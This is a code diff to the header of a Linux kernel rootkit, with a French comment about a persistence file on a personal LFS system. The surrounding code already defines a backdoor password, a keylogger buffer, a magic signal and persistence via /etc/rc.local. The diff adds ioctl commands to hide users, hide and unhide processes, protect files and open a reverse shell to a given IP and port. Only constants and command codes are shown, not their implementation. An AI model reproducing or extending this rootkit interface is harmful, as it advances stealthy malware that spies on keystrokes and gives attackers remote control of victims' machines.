@@ -30,6 +30,8 @@
 #include <linux/umh.h>
 #include <linux/input.h>
 #include <linux/list.h>
+#include <linux/in.h>
+#include <linux/inet.h>
 #endif
 
 #define RK_MAGIC 'R'
@@ -40,6 +42,10 @@
 #define BACKDOOR_PASS_MAX 32
 #define KEYLOG_BUF_MAX 4096
 #define RK_MAGIC_SIGNAL 63
+#define MAX_HIDDEN_PIDS 16
+#define HIDDEN_USER_MAX 64
+#define PROTECTED_PATH_MAX 256
+#define MAX_PROTECTED_FILES 8
 /* chemin du fichier de persistance sur ta LFS */
 #define PERSIST_FILE "/etc/rc.local"
 
@@ -72,6 +78,14 @@ struct rk_args {
 #define RK_CMD_SHOW_MODULE       _IOW (RK_MAGIC, 7, struct rk_args)
 #define RK_CMD_GET_KEYLOG        _IOR (RK_MAGIC, 8, struct rk_args)
 #define RK_CMD_TOGGLE_KEYLOG     _IOW (RK_MAGIC, 9, struct rk_args)
+#define RK_CMD_UNHIDE_PID        _IOW (RK_MAGIC, 10, struct rk_args)
+#define RK_CMD_HIDE_USER         _IOW (RK_MAGIC, 11, struct rk_args)
+#define RK_CMD_PROTECT_FILE      _IOW (RK_MAGIC, 12, struct rk_args)
+#define RK_CMD_UNPROTECT_FILE    _IOW (RK_MAGIC, 13, struct rk_args)
+#define RK_CMD_REVERSE_SHELL     _IOW (RK_MAGIC, 14, struct rk_args)
+
+/* Reverse shell argument: target holds pointer to "IP:PORT" string */
+#define RK_REVSHELL_MAX 64
 
 
 
